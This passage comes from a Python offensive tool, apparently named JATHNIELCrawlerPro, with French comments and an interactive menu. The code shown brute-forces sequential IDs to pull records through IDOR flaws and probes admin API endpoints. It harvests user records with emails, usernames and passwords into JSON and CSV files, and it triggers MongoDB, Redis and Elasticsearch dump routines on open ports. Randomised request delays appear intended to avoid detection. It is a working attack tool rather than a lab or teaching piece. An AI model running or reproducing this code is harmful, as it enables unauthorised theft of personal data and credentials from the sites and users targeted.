            for i in range(1, self.config['max_idor_ids'] + 1):
                url = f"{base}{pattern.replace('{id}', str(i))}"
                try:
                    r = requests.get(url, headers={'User-Agent': self.config['user_agent']},
                                     timeout=8, verify=self.config['verify_ssl'])
                    if r.status_code == 200 and r.text:
                        try:
                            data = json.loads(r.text)
                        except Exception:
                            data = r.text[:2000]
                        extracted.append({'id': i, 'data': data})
                        if i <= 3 or i % 20 == 0:
                            print(f"    [OK] ID {i}: {len(r.content)}o")
                except Exception:
                    pass
                time.sleep(random.uniform(0.1, 0.3))
                if len(extracted) == 0 and i > 10:
                    break
            if extracted:
                self.results['idor_data'].append({
                    'pattern': pattern,
                    'count': len(extracted),
                    'objects': extracted,
                })
                self._harvest_users_from_idor(extracted)
                print(f"  [OK] {len(extracted)} objet(s) via {pattern}")
        return self.results['idor_data']

    def _harvest_users_from_idor(self, objects):
        for obj in objects:
            data = obj.get('data')
            if isinstance(data, dict):
                if 'data' in data and isinstance(data['data'], dict):
                    data = data['data']
                if 'user' in data and isinstance(data['user'], dict):
                    data = data['user']
                if any(k in str(data).lower() for k in ['email', 'username', 'password']):
                    self.results['extracted_users'].append(data)

    # ==================== API ADMIN ====================

    def api_admin_scan(self):
        print(f"\n{self.colorize('[API] API Admin Discovery', 'cyan', bold=True)}")
        base = self.target_url.rstrip('/')
        found = []
        for ep in ADMIN_API_ENDPOINTS:
            url = base + ep
            try:
                r = requests.get(url, headers={'User-Agent': self.config['user_agent']},
                                 timeout=8, verify=self.config['verify_ssl'])
                if r.status_code == 200 and len(r.content) > 100:
                    head = r.content[:500]
                    if self._is_false_positive(head):
                        continue
                    try:
                        data = json.loads(r.text)
                    except Exception:
                        data = r.text[:5000]
                    found.append({'endpoint': ep, 'url': url, 'data': data})
                    print(f"  [OK] {ep} -> {len(r.content)}o")
                    if isinstance(data, dict):
                        self._harvest_users_from_json(data)
                    elif isinstance(data, list):
                        for item in data[:100]:
                            if isinstance(item, dict):
                                self._harvest_users_from_json(item)
            except Exception:
                pass
            time.sleep(random.uniform(0.2, 0.5))
        self.results['api_admin_data'] = found
        print(f"\n  [OK] {len(found)} endpoint(s)")
        return found

    def _harvest_users_from_json(self, data):
        if isinstance(data, dict):
            keys_lower = [k.lower() for k in data.keys()]
            if any(k in keys_lower for k in ['email', 'username', 'password', 'password_hash']):
                self.results['extracted_users'].append(data)
            else:
                for v in data.values():
                    if isinstance(v, (dict, list)):
                        self._harvest_users_from_json(v)
        elif isinstance(data, list):
            for item in data[:200]:
                self._harvest_users_from_json(item)

    def _harvest_users_from_dump(self, db_dump):
        for coll_name, docs in db_dump.get('collections', {}).items():
            for doc in docs[:500]:
                if isinstance(doc, dict):
                    keys_lower = [k.lower() for k in doc.keys()]
                    if any(k in keys_lower for k in ['email', 'username', 'password']):
                        self.results['extracted_users'].append(doc)

    # ==================== ORCHESTRATEUR ====================

    def recon_complet(self, url):
        self.target_url = url
        parsed = urlparse(url)
        self.target_domain = parsed.netloc
        self.target_host = parsed.hostname or parsed.netloc.split(':')[0]

        site_dir = f"{self.config['output_dir']}/{self.target_domain}"
        for sub in ['pages', 'assets', 'sensitive', 'databases', 'reports',
                    'git_dump', 'db_dumps', 'subdomains', 'wayback', 'api', 'idor']:
            os.makedirs(f"{site_dir}/{sub}", exist_ok=True)

        self.results['statistics']['start_time'] = datetime.now()

        print(f"\n{self.colorize('RECON COMPLET', 'cyan', bold=True)}")
        print(f"  Cible: {url}")
        print(f"  Host:  {self.target_host}")
        print(self.colorize("=" * 70, 'blue'))

        self.detect_spa_and_baseline(url)

        if self.config['scan_ports']:
            open_ports = self.scan_ports(self.target_host)
            for port, service in open_ports:
                if port == 27017:
                    self.exploit_mongodb(self.target_host, port)
                elif port == 6379:
                    self.exploit_redis(self.target_host, port)
                elif port == 9200:
                    self.exploit_elasticsearch(self.target_host, port)

        if self.config['subdomain_enum']:
            self.subdomain_enum(self.target_domain)

        if self.config['wayback']:
            self.wayback_machine(self.target_domain)

        self._crawl_simple(url, site_dir)

        if self.config['js_parsing']:
            self.parse_js_deep()

        if self.config['idor_scan']:
            self.idor_scan()

        if self.config['api_admin_scan']:
            self.api_admin_scan()

        self.results['statistics']['end_time'] = datetime.now()
        self.results['statistics']['duration'] = (
            self.results['statistics']['end_time'] -
            self.results['statistics']['start_time']
        ).total_seconds()

        self._print_recon_summary()
        self.save_results(site_dir)

    def _crawl_simple(self, url, site_dir):
        print(f"\n{self.colorize('[CRAWL] Crawl des pages', 'cyan', bold=True)}")
        q = queue.Queue()
        q.put((url, 0))
        seen = set([url])

        def worker():
            while True:
                try:
                    u, depth = q.get(timeout=3)
                except queue.Empty:
                    return
                try:
                    if depth > self.config['max_depth'] or len(seen) > self.config['max_pages']:
                        continue
                    r = requests.get(u, headers={'User-Agent': self.config['user_agent']},
                                     timeout=15, verify=self.config['verify_ssl'])
                    if r.status_code != 200:
                        continue
                    with self.lock:
                        self.results['statistics']['total_pages'] += 1
                        self.results['pages'].append({
                            'url': u, 'status': r.status_code,
                            'size': len(r.content), 'html': r.text[:50000]
                        })
                    try:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        for a in soup.find_all('a', href=True):
                            link = urljoin(u, a['href'])
                            if self.target_domain in urlparse(link).netloc and link not in seen:
                                seen.add(link)
                                q.put((link, depth + 1))
                        for tag in soup.find_all(['script', 'link', 'img']):
                            src = tag.get('src') or tag.get('href')
                            if src:
                                full = urljoin(u, src)
                                if any(full.lower().endswith(ext) for ext in
                                       ['.js', '.css', '.jpg', '.png', '.svg']):
                                    if self.target_domain in urlparse(full).netloc:
                                        self._save_asset(full, site_dir)
                    except Exception:
                        pass
                except Exception:
                    pass
                finally:
                    q.task_done()
                time.sleep(self.config['delay'])

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=120)

    def _save_asset(self, url, site_dir):
        with self.lock:
            if url in self.visited_assets:
                return
            self.visited_assets.add(url)
        try:
            r = requests.get(url, headers={'User-Agent': self.config['user_agent']},
                             timeout=15, verify=self.config['verify_ssl'])
            if r.status_code != 200 or len(r.content) > 20 * 1024 * 1024:
                return
            fname = urlparse(url).path.split('/')[-1] or hashlib.md5(url.encode()).hexdigest()
            fname = re.sub(r'[<>:"/\\|?*]', '_', fname)[:100]
            fpath = os.path.join(site_dir, 'assets', fname)
            with open(fpath, 'wb') as f:
                f.write(r.content)
            with self.lock:
                self.results['assets'].append({
                    'url': url, 'filename': fname, 'size': len(r.content), 'path': fpath
                })
                self.results['statistics']['total_assets'] += 1
        except Exception:
            pass

    def _print_recon_summary(self):
        r = self.results
        print(f"\n{self.colorize('=' * 60, 'cyan')}")
        print(f"{self.colorize('RESUME RECON', 'bold')}")
        print(f"{self.colorize('=' * 60, 'cyan')}")
        print(f"  Pages crawlees      : {r['statistics']['total_pages']}")
        print(f"  Assets              : {r['statistics']['total_assets']}")
        print(f"  Ports ouverts       : {len(r['open_ports'])}")
        for p in r['open_ports']:
            print(f"      - {p['service']} :{p['port']}")
        print(f"  Sous-domaines       : {len(r['subdomains'])}")
        print(f"  URLs Wayback        : {len(r['wayback_urls'])}")
        print(f"  Endpoints JS        : {len(r['js_endpoints'])}")
        print(f"  Secrets JS          : {len(r['js_secrets'])}")
        print(f"  IDOR objets         : {sum(d['count'] for d in r['idor_data'])}")
        print(f"  API admin hits      : {len(r['api_admin_data'])}")
        print(f"  Users extraits      : {len(r['extracted_users'])}")
        print(f"  DB DUMPS            : {r['statistics']['total_dumps']}")
        print(f"{self.colorize('=' * 60, 'cyan')}")

        if r['db_dumps']:
            print(f"\n{self.colorize('[!] BASES DE DONNEES EXTRAITES :', 'red', bold=True)}")
            for i, dump in enumerate(r['db_dumps'], 1):
                if 'db' in dump:
                    print(f"  {i}. MongoDB DB '{dump['db']}' ({len(dump.get('collections', {}))} collections)")
                elif 'keys' in dump:
                    print(f"  {i}. Redis ({len(dump['keys'])} cles)")
                elif 'indices' in dump:
                    print(f"  {i}. Elasticsearch ({len(dump['indices'])} indices)")

        if r['extracted_users']:
            count = len(r['extracted_users'])
            header = self.colorize(f'[!] {count} UTILISATEURS EXTRAITS', 'red', bold=True)
            print(f"\n{header}")
            for u in r['extracted_users'][:10]:
                if isinstance(u, dict):
                    email = u.get('email') or u.get('username') or '?'
                    print(f"  - {email}")

    # ==================== SAVE ====================

    def save_results(self, site_dir):
        json_path = os.path.join(site_dir, 'recon_results.json')
        data = dict(self.results)
        data['pages'] = [{k: v for k, v in p.items() if k != 'html'}
                        for p in data['pages']]
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, default=str)

        if self.results['extracted_users']:
            users_path = os.path.join(site_dir, 'extracted_users.json')
            with open(users_path, 'w', encoding='utf-8') as f:
                json.dump(self.results['extracted_users'], f, indent=2, default=str)
            csv_path = os.path.join(site_dir, 'extracted_users.csv')
            keys = set()
            for u in self.results['extracted_users']:
                if isinstance(u, dict):
                    keys.update(u.keys())
            keys = sorted(keys)
            if keys:
                with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                    w = csv.DictWriter(f, fieldnames=keys, extrasaction='ignore')
                    w.writeheader()
                    for u in self.results['extracted_users']:
                        if isinstance(u, dict):
                            w.writerow(u)

        for i, dump in enumerate(self.results['db_dumps']):
            name = dump.get('db') or dump.get('host', f'dump_{i}').replace(':', '_')
            path = os.path.join(site_dir, 'db_dumps', f'{name}.json')
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(dump, f, indent=2, default=str)

        if self.results['idor_data']:
            with open(os.path.join(site_dir, 'idor', 'idor_data.json'), 'w') as f:
                json.dump(self.results['idor_data'], f, indent=2, default=str)

        if self.results['api_admin_data']:
            with open(os.path.join(site_dir, 'api', 'admin_data.json'), 'w') as f:
                json.dump(self.results['api_admin_data'], f, indent=2, default=str)

        print(f"\n{self.colorize('[SAVE] Resultats sauvegardes:', 'green')}")
        print(f"  {site_dir}/")
        print(f"     - recon_results.json")
        if self.results['extracted_users']:
            print(f"     - extracted_users.json ({len(self.results['extracted_users'])} users)")
            print(f"     - extracted_users.csv")
        if self.results['db_dumps']:
            print(f"     - db_dumps/ ({len(self.results['db_dumps'])} dump(s))")

    def change_target(self):
        print(self.colorize("\n[CHANGE] CHANGER DE CIBLE", 'bold'))
        print(f"Cible actuelle: {self.target_url or '(aucune)'}")
        new_url = self.get_user_input("\nNouvelle URL", "")
        if not new_url:
            return
        if not new_url.startswith(('http://', 'https://')):
            new_url = 'https://' + new_url
        self.reset_state()
        self.target_url = new_url
        self.target_domain = urlparse(new_url).netloc
        self.target_host = urlparse(new_url).hostname or self.target_domain
        print(self.colorize(f"\n[OK] Nouvelle cible: {self.target_url}", 'green'))
        input(self.colorize("\nEntree pour continuer...", 'blue'))

    # ==================== MENU ====================

    def run(self):
        while True:
            self.clear_screen()
            self.show_banner()
            self.show_menu()
            choice = input(self.colorize("\n>>> Choix: ", 'bold')).strip()

            if choice == '1':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url
                    for k in ['scan_ports', 'subdomain_enum', 'wayback',
                              'js_parsing', 'idor_scan', 'api_admin_scan']:
                        self.config[k] = False
                    self.recon_complet(url)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '2':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url
                    self.config['scan_ports'] = False
                    self.config['subdomain_enum'] = False
                    self.config['wayback'] = False
                    self.config['idor_scan'] = True
                    self.config['api_admin_scan'] = True
                    self.recon_complet(url)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '3':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url
                    for k in ['scan_ports', 'subdomain_enum', 'wayback',
                              'js_parsing', 'idor_scan', 'api_admin_scan']:
                        self.config[k] = True
                    self.recon_complet(url)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '4':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    host = urlparse(url if '://' in url else 'http://' + url).hostname
                    if host:
                        self.target_host = host
                        ports = self.scan_ports(host)
                        for port, service in ports:
                            if port == 27017:
                                self.exploit_mongodb(host, port)
                            elif port == 6379:
                                self.exploit_redis(host, port)
                            elif port == 9200:
                                self.exploit_elasticsearch(host, port)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '5':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    domain = urlparse(url if '://' in url else 'http://' + url).netloc
                    self.subdomain_enum(domain)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '6':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    domain = urlparse(url if '://' in url else 'http://' + url).netloc
                    self.wayback_machine(domain)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '7':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    self.target_url = url
                    self.idor_scan()
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '8':
                url = self.get_user_input("URL cible", self.target_url or "https://example.com")
                if url:
                    self.target_url = url
                    self.api_admin_scan()
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '9':
                self.change_target()

            elif choice == '10':
                self._print_recon_summary()
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '11':
                if not self.target_domain:
                    print(self.colorize("Aucune cible", 'red'))
                    input()
                    continue
                site_dir = f"{self.config['output_dir']}/{self.target_domain}"
                self.save_results(site_dir)
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '12':
                print(self.colorize("\n[CONFIG]", 'bold'))
                for k, v in self.config.items():
                    print(f"  {k}: {v}")
                input(self.colorize("\nEntree...", 'blue'))

            elif choice == '0':
                print(self.colorize("\nAu revoir!", 'green'))
                sys.exit(0)
            else:
                print(self.colorize("Choix invalide", 'red'))
                time.sleep(1)


if __name__ == "__main__":
    try:
        try:
            import requests
            from bs4 import BeautifulSoup
        except ImportError:
            print("[!] Installation deps...")
            os.system("pip3 install requests beautifulsoup4 pymongo")
        crawler = JATHNIELCrawlerPro()
        crawler.run()
    except KeyboardInterrupt:
        print("\n\nAu revoir!")
        sys.exit(0)
    except Exception as e:
        print(f"\nErreur: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)